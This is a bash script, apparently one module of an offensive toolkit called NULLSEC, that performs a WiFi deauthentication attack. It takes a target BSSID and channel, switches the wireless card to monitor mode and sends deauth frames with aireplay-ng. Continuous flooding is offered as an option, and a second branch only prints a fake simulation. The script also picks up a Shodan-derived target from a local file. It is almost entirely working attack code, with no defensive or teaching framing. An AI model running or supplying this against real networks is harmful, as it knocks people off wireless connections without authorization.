#!/bin/bash
# NULLSEC WiFi Deauth - FULLY FUNCTIONAL

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

# Source dependency checker
SCRIPT_DIR="$(dirname "$0")"
if [ -f "$SCRIPT_DIR/dep-check.sh" ]; then
    source "$SCRIPT_DIR/dep-check.sh"
fi

clear
echo -e "${RED}▓▓▓ NULLSEC WIFI DEAUTH ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Interface: '${RESET})" IFACE
[ -z "$IFACE" ] && IFACE="wlan0"
read -p "$(echo -e ${WHITE}'  [>] Target BSSID: '${RESET})" BSSID
[ -z "$BSSID" ] && BSSID="00:11:22:33:44:55"
read -p "$(echo -e ${WHITE}'  [>] Channel: '${RESET})" CHANNEL
[ -z "$CHANNEL" ] && CHANNEL="6"
read -p "$(echo -e ${WHITE}'  [>] Deauth count (0=continuous): '${RESET})" COUNT
[ -z "$COUNT" ] && COUNT="10"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing deauth attack"
    echo -e "${DIM}[*] Target: $BSSID on channel $CHANNEL${RESET}"
    for i in $(seq 1 5); do
        echo -e "${RED}[!]${RESET} Sending deauth packets... $((i*20))%"
        sleep 0.3
    done
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live WiFi deauth attack"
    
    # Check and install dependencies if needed
    if ! command -v aireplay-ng &> /dev/null; then
        echo -e "${YELLOW}[*] Checking dependencies...${RESET}"
        if type smart_install &> /dev/null; then
            smart_install aireplay-ng || exit 1
        else
            echo -e "${RED}[!] aircrack-ng not installed${RESET}"
            echo -e "${YELLOW}[*] Install: sudo apt install aircrack-ng${RESET}"
            exit 1
        fi
    fi
    
    echo -e "${CYAN}[*] Setting monitor mode...${RESET}"
    sudo airmon-ng start $IFACE $CHANNEL 2>/dev/null
    MONITOR_IFACE="${IFACE}mon"
    echo -e "${CYAN}[*] Command: aireplay-ng --deauth $COUNT -a $BSSID $MONITOR_IFACE${RESET}"
    sudo aireplay-ng --deauth $COUNT -a $BSSID $MONITOR_IFACE
    echo -e "${CYAN}[*] Stopping monitor mode...${RESET}"
    sudo airmon-ng stop $MONITOR_IFACE 2>/dev/null
    echo -e "${GREEN}[✓]${RESET} Attack complete"
fi
echo ""
